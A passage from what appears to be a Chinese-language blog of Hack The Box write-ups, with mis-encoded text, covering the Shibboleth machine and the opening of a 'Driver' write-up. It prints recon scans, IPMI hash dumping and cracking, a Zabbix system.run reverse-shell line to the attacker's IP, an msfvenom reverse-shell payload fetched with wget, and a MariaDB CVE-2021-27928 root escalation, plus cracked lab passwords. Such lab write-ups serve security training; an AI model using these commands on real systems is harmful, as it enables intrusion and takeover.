EST\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 2.92 seconds\n```\nä¸€å°ç¦pingçš„ä¸»æœºï¼ŒåŠ ä¸Š-Pnå‚æ•°å§\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -Pn --min-rate 5000 10.10.11.124\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:32 EST\nNmap scan report for bogon (10.10.11.124)\nHost is up (0.27s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://shibboleth.htb/\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=31778%PV=Y%DS=2%DC=T%G=Y%TM=61A981D\nOS:1%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(\nOS:SP=FC%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=\nOS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE\nOS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7\nOS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z\nOS:%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y\nOS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR\nOS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40\nOS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G\nOS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: shibboleth.htb\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   272.47 ms bogon (10.10.14.1)\n2   273.08 ms bogon (10.10.11.124)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 33.70 seconds\n```\nå‘ç°åªæœ‰ä¸€ä¸ª80ç«¯å£ï¼Œå»è®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Shibboleth/c230e3fb-d039-4262-9e67-7929a1dc53db.png)\n\nç›´æ¥è®¿é—®ä¼šè¢«è·³è½¬åˆ°shibboleth.htbï¼Œå’±ä»¬ç»™ä»–åŠ ä¸€ä¸ªhosts\n\n```bash\necho 10.10.11.124 shibboleth.htb >> /etc/hosts\n```\n![](Hackthebox-Shibboleth/fb942a60-8355-4c44-acdc-34947ab70cd7.png)\n\nå†æ¬¡è®¿é—®å°±æ²¡é—®é¢˜äº†ï¼Œè€è§„çŸ©ï¼Œæ‰«æä¸€ä¸‹URLï¼Œç„¶åé¡ºä¾¿çœ‹çœ‹ç½‘é¡µ\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# ffuf -u \"http://shibboleth.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://shibboleth.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n________________________________________________\n\nassets                  [Status: 301, Size: 317, Words: 20, Lines: 10]\nforms                   [Status: 301, Size: 316, Words: 20, Lines: 10]\n.                       [Status: 200, Size: 59474, Words: 17014, Lines: 1324]\n:: Progress: [43003/43003] :: Job [1/1] :: 123 req/sec :: Duration: [0:05:55] :: Errors: 0 ::\n```\nå¥½åƒä¹Ÿæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œæ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Ÿæ‰¾ä¸€ä¸‹vhostè¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# ffuf -u \"http://shibboleth.htb/\" -H \"Host:FUZZ.shibboleth.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://shibboleth.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.shibboleth.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200\n________________________________________________\n\nmonitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]\nmonitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]\nzabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]\n:: Progress: [4989/4989] :: Job [1/1] :: 95 req/sec :: Duration: [0:00:49] :: Errors: 0 ::\n```\nå‘ç°ä¸‰ä¸ªvshostï¼Œéƒ½åŠ å…¥åˆ°hostså†…å§\n\n```bash\necho 10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb >> /etc/hosts\n```\n![](Hackthebox-Shibboleth/f6ab2e53-4ef3-45ad-872c-e5da0546c6ae.png)\n\nä¸‰ä¸ªvhoståˆ°çš„é¡µé¢éƒ½æ˜¯ä¸€æ ·çš„\n\n![](Hackthebox-Shibboleth/74dbcaa4-e99e-412d-96d3-8adf951ab178.png)\n\næµ‹è¯•äº†ä¸€ä¸‹é»˜è®¤å£ä»¤å’Œå¼±å£ä»¤ï¼Œå‡æ— æ³•æ­£å¸¸è¿›å…¥\n\næ‰«æä¸€ä¸‹ZABBIXçš„UDPç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -Pn -sU --min-rate 5000 10.10.11.124\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 21:34 EST\nNmap scan report for bogon (10.10.11.124)\nHost is up (0.25s latency).\nNot shown: 1002 closed ports, 996 open|filtered ports\nPORT    STATE SERVICE  VERSION\n80/tcp  open  http     Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://shibboleth.htb/\n623/udp open  asf-rmcp\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port623-UDP:V=7.91%I=7%D=12/2%Time=61A98220%P=x86_64-pc-linux-gnu%r(ipm\nSF:i-rmcp,1E,\"\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01\nSF:\\x97\\x04\\x03\\0\\0\\0\\0\\t\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=12/2%OT=80%CT=1%CU=19625%PV=Y%DS=2%DC=T%G=Y%TM=61A99CF\nOS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11\nOS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\nOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=\nOS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF\nOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40\nOS:%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host: shibboleth.htb\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   262.39 ms bogon (10.10.14.1)\n2   247.76 ms bogon (10.10.11.124)\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6882.83 seconds\n```\n## æ¼æ´åˆ©ç”¨\nå»Googleä¸€ä¸‹623ç«¯å£çš„æœåŠ¡çœ‹çœ‹æ˜¯å¦æœ‰å¯åˆ©ç”¨çš„æ¼æ´\n\nGoogle asf-rmcp exploit\n\n![](Hackthebox-Shibboleth/96cc7ff7-1e03-471c-aee4-4f683f4ab284.png)\n\nè¿˜çœŸæ‰¾åˆ°ä¸€ç¯‡ç›¸å…³æ–‡ç« \n\n> [https://book.hacktricks.xyz/pentesting/623-udp-ipmi](https://book.hacktricks.xyz/pentesting/623-udp-ipmi)\n\n![](Hackthebox-Shibboleth/b017f782-4a06-4387-a524-96560b34c234.png)\n\nè¿™é‡Œä»‹ç»äº†msfä¸­ipmiçš„ç‰ˆæœ¬è¯†åˆ«çš„è„šæœ¬ï¼Œå»å°è¯•ä¸€ä¸‹\n\n```bash\nmsf6 > use auxiliary/scanner/ipmi/ipmi_version\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_version):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT      623              yes       The target port (UDP)\n   THREADS    10               yes       The number of concurrent threads\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.10.11.124\nrhosts => 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_version) > exploit \n\n[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)\n[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\nç¡®å®šäº†ç‰ˆæœ¬ï¼Œç„¶åå’±ä»¬å»æ‰¾ä¸€ä¸‹æ˜¯å¦æœ‰åˆ©ç”¨æ¨¡å—\n\n![](Hackthebox-Shibboleth/52e4bc5d-22b7-4d35-9cce-9d35df90edcc.png)\n\nè¿™é‡Œæœ‰ä¸€ä¸ªhashdumpçš„è„šæœ¬ï¼Œä¼¼ä¹å¯ä»¥å¯¼å‡ºhashï¼Œå’±ä»¬è¯•è¯•\n\n```bash\nmsf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options \n\nModule options (auxiliary/scanner/ipmi/ipmi_dumphashes):\n\n   Name                 Current Setting                                                    Required  Description\n   ----                 ---------------                                                    --------  -----------\n   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained\n   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format\n   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format\n   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line\n   RHOSTS                                                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT                623                                                                yes       The target port\n   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)\n   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.10.11.124\nrhosts => 10.10.11.124\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit \n\n[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªè´¦æˆ·çš„hashï¼Œå’±ä»¬ä½¿ç”¨hashcatçˆ†ç ´hash\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt\nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================================\n* Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 1417/1481 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\nIf you want to switch to optimized backend kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 65 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52ceb6e71fbc12d40f67cde218e697ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1781a47a5579c8c35f0aef780437cf422d27dcd6:ilovepumkinpie1\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: IPMI2 RAKP HMAC-SHA1\nHash.Target......: 9c0bae80041f0000c6c1b11a809d97676ccfcd485b132a1cf52...27dcd6\nTime.Started.....: Thu Dec  2 21:26:57 2021 (5 secs)\nTime.Estimated...: Thu Dec  2 21:27:02 2021 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  1534.7 kH/s (1.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 7397376/14344385 (51.57%)\nRejected.........: 0/7397376 (0.00%)\nRestore.Point....: 7393280/14344385 (51.54%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: iloverobert!!! -> ilovemymum64.\n\nStarted: Thu Dec  2 21:26:38 2021\nStopped: Thu Dec  2 21:27:03 2021\n```\næˆåŠŸçˆ†ç ´å‡ºhashï¼Œç¡®å®šäº†è´¦å·å¯†ç \n\n```bash\nUsername = Administrator\nPassword = ilovepumkinpie1\n```\næ‹¿ç€è´¦å·å¯†ç å»ç™»å½•åå°è¯•è¯•\n\n![](Hackthebox-Shibboleth/7c2b002b-3439-4583-a917-607d7a7348eb.png)\n\næˆåŠŸç™»å½•åå°\n\n![](Hackthebox-Shibboleth/80737e6b-fceb-4baf-b944-3a5c023367ef.png)\n\n![](Hackthebox-Shibboleth/da7ccd22-ad14-469c-9e75-2efd64bde119.png)\n\nç»è¿‡æµ‹è¯• åœ¨Configgurationçš„Hostsé‡Œç‚¹å‡»Itemsï¼Œç„¶åè¿›å»æ·»åŠ æ–°é¡¹ç›®çš„çš„Keyå¤„ï¼Œä¹Ÿå¯ä»¥Getshell\n\næœ‰ä¸¤ç¯‡Zabbixçš„ç›¸å…³æ–‡ç« å¤§å®¶å¯ä»¥çœ‹ä¸€ä¸‹\n\n> [https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix\\_agent](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent)\n\n> [https://sbcode.net/zabbix/agent-execute-python/](https://sbcode.net/zabbix/agent-execute-python/)\n\n```bash\nsystem.run[/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.19/4444 0>&1\",nowait]\n```\nè¿™è¾¹éœ€è¦ä½¿ç”¨system.runæ¥è¿›è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œä¸Šé¢å°±æ˜¯æˆ‘ä»¬çš„exploit\n\né¦–å…ˆä½¿ç”¨ncè¿›è¡Œä¸€ä¸ªç«¯å£ç›‘å¬\n\n```bash\nnc -nvlp 4444\n```\nç„¶ååœ¨ç½‘é¡µä¸­çš„Keyå¤„è¾“å…¥æˆ‘ä»¬çš„Exploitï¼Œç„¶åä¿å­˜å°±å¯ä»¥äº†\n\n![](Hackthebox-Shibboleth/56be94fd-4b1c-45b5-8450-fa4e8071b571.png)\n\nç„¶åç‚¹å‡»æœ€ä¸‹é¢çš„ä¿å­˜ï¼Œå°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„Exploit\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 54322\nsh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\nzabbix@shibboleth:/$ whoami&&id\nwhoami&&id\nzabbix\nuid=110(zabbix) gid=118(zabbix) groups=118(zabbix)\n```\næˆåŠŸè·å¾—ä¸€ä¸ªshell\n\n## æƒé™æå‡\n### Useræƒé™\n```bash\nzabbix@shibboleth:/$ cat /etc/passwd | grep bash\ncat /etc/passwd | grep bash\nroot:x:0:0:root:/root:/bin/bash\nipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash\n```\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹æœ‰bashæƒé™çš„è´¦æˆ·ï¼Œæœ‰ä¸€ä¸ªipmi-svcï¼Œçœ‹æ¥å’±ä»¬å¿…é¡»å¾—ææƒåˆ°å®ƒ\n\næˆ‘ä»¬éœ€è¦ç™»å½•åˆ°ipmi-svcè´¦æˆ·ï¼Œå¯†ç ä¸ç½‘ç«™åå°å¯†ç æ˜¯ä¸€æ ·çš„\n\n```bash\nzabbix@shibboleth:/etc/zabbix$ su ipmi-svc\nsu ipmi-svc\nPassword: ilovepumkinpie1\n\nipmi-svc@shibboleth:/etc/zabbix$ whoami&&id\nwhoami&&id\nipmi-svc\nuid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)\n```\n```bash\nipmi-svc@shibboleth:/tmp$ cd\ncd\nipmi-svc@shibboleth:~$ ls\nls\nuser.txt\nipmi-svc@shibboleth:~$ cat user.txt\ncat user.txt\nb6611bf946f56dc23bcfc3e77f150204\n```\næˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶\n\n### rootæƒé™\nåœ¨zabbixæœåŠ¡å™¨ä¸‹æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶å¯†ç \n\n```bash\nipmi-svc@shibboleth:/etc/zabbix$ grep -iR 'password' /etc/zabbix/ 2>/dev/null\ngrep -iR 'password' /etc/zabbix/ 2>/dev/null\n/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword\n/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Database password.\n/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Comment this line if no password is used.\n/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=\n/etc/zabbix/zabbix_server.conf:### Option: DBPassword\n/etc/zabbix/zabbix_server.conf:#        Database password.\n/etc/zabbix/zabbix_server.conf:#        Comment this line if no password is used.\n/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh\n```\nç„¶åç™»å½•mysqlæœåŠ¡\n\n```bash\nipmi-svc@shibboleth:/etc/zabbix$ mysql -u zabbix -p -D zabbix\nmysql -u zabbix -p -D zabbix\nEnter password: bloooarskybluh\n\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 2954\nServer version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n```\nå°†10.3.25-MariaDBè¯¥ç‰ˆæœ¬æ‹¿å»Googleä¸€ä¸‹\n\n![](Hackthebox-Shibboleth/fe758a28-0830-4d9b-84e2-296193441a07.png)\n\n> [https://github.com/Al1ex/CVE-2021-27928](https://github.com/Al1ex/CVE-2021-27928)\n\næ‰¾åˆ°äº†ä¸€ä¸ªCVE\n\nè¯¥Exploitå¤§æ¦‚åˆ†ä¸ºå‡ æ­¥\n\n```bash\nStep 1ï¼š\nä½¿ç”¨Msfç”Ÿæˆä¸€ä¸ª.soçš„æœ¨é©¬\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=5555 -f elf-so -o Exploit.so\n\nStep 2ï¼š\nä½¿ç”¨NCç›‘å¬ä¸€ä¸ªç«¯å£\nNc -nvlp 5555\n\nStep 3ï¼š\nå°†Exploitä¸Šä¼ åˆ°é¶æœºçš„/tmpç›®å½•ä¸‹\næœ¬åœ°æœºå™¨ï¼šPython3å¼€å§‹ä¸€ä¸ªHttpæœåŠ¡\npython3 -m http.server 80\n\né¶æœºï¼šä¸‹è½½Exploitå¹¶ä¿å­˜åˆ°/tmpç›®å½•ä¸‹\ncd /tmp\nwget http://10.10.14.19/Exploit.so\n\nStep 4ï¼š\nç™»å½•mysqlåæ‰§è¡Œè„šæœ¬\nSET GLOBAL wsrep_provider=\"/tmp/Exploit.so\";\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.19] from (UNKNOWN) [10.10.11.124] 38044\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nroot@shibboleth:/var/lib/mysql# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸè·å¾—rootæƒé™\n\n```bash\nroot@shibboleth:/var/lib/mysql# cd /root\ncd /root\nroot@shibboleth:/root# ls\nls\nroot.txt  scripts\nroot@shibboleth:/root# cat root.txt\ncat root.txt\nf99dbe4d5d33fc228cb8eaaf5cf0d2ac\n```\næˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Driver - Hackthebox","url":"/2021/11/26/Hackthebox/Easy/Hackthebox-Driver/","content":"\n# Hackthebox - Driver\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Driver/image1.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Driver/image2.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨`nmap`è¿›è¡Œç«¯å£æ‰«æ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.106\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 09:33 EDT\nNmap scan report for 10.10.11.106\nHost is up (0.28s latency).\nNot shown: 65531 filtered ports\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Microsoft IIS httpd 10.0\n| http-auth:\n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=MFP Firmware Update Center. Please enter password for admin\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n135/tcp  open  msrpc        Microsoft Windows RPC\n445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|specialized|phone\nRunning (JUST GUESSING): Microsoft Windows 2008|Vista|7|8.1|Phone (90%), FreeBSD 6.X (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_vista::sp2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:freebsd:freebsd:6.2\nAggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Embedded Standard 7 (88%), Microsoft Windows 7 (88%), Microsoft Windows Server 2008 (88%), Microsoft Windows 7 or Windows Server 2008 R2 (86%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (86%), Microsoft Windows 7 Professional or Windows 8 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m52s\n| smb-security-mode:\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2021-10-12T20:34:34\n|_  start_date: 2021-10-12T11:55:48\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT       ADDRESS\n1   274.83 ms 10.10.14.1\n2   274.88 ms 10.10.11.106\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 102.40 secon\n```\n![](Hackthebox-Driver/image3.png)\n\nè®¿é—®`80`ç«¯å£æç¤ºéœ€è¦ç™»å½•ï¼Œéšä¾¿æµ‹ä¸ª`0 day(admin/admin)`å§\n\n![](Hackthebox-Driver/image4.png)\n\n0 dayçœŸå¥½ç”¨ï¼Œç›´æ¥å°±è¿›æ¥äº†\n\n![](Hackthebox-Driver/image5.png)\n\nåœ¨`Firmware Updates`å¤„æœ‰ä¸ªä¸Šä¼ ç‚¹ï¼Œè¯´ä¸å®šæ˜¯çªç ´å£\n\n![](Hackthebox-Driver/image6.png)\n\nå°è¯•äº†ä¸€ä¸‹ä¸Šä¼ ï¼Œä½†ä¼¼ä¹æ˜¯å¤±è´¥äº†ï¼Œè¿˜å¾—æ‰¾å…¶ä»–æ€è·¯æ¥çªç ´\n\nå’±ä»¬æŠŠç›®å…‰æ”¾åœ¨smbä¸Šï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« ï¼Œå…¶ä¸­çš„é€šè¿‡NTLMæ•è·è¿›è¡Œæ”»å‡»æˆ‘è§‰å¾—æŒºä¸é”™çš„\n\n> 